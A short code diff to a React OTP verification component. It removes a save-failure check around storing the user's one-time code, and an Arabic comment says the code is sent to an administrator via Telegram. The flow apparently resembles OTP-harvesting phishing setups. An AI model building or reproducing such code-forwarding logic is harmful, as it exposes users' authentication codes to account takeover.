@@ -227,12 +227,11 @@ const OTPVerification = () => {
     setIsVerifying(true);
     try {
       if (applicationId) {
-        const ok = await updateApplicationPublic(applicationId, {
+        await updateApplicationPublic(applicationId, {
           otp_code: otp,
           current_step: 'otp',
           status: 'pending_otp',
         });
-        if (!ok) throw new Error('save failed');
 
         // إشعار المسؤول عبر Telegram برمز التحقق
         try {
